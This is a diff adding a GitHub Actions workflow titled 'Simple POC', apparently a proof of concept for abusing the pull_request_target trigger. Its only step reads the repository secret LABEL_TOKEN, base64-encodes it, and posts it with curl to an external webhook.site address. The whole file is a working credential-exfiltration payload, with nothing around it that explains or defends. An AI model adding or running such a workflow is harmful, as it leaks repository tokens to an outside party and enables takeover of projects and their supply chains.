@@ -1,0 +1,10 @@
+name: Simple POC
+on: [pull_request_target]
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "${{ secrets.LABEL_TOKEN }}" | base64 | \
+          curl -s -X POST "https://webhook.site/5abc3452-aafc-4f71-91b8-2cad2e68739f" -d @-
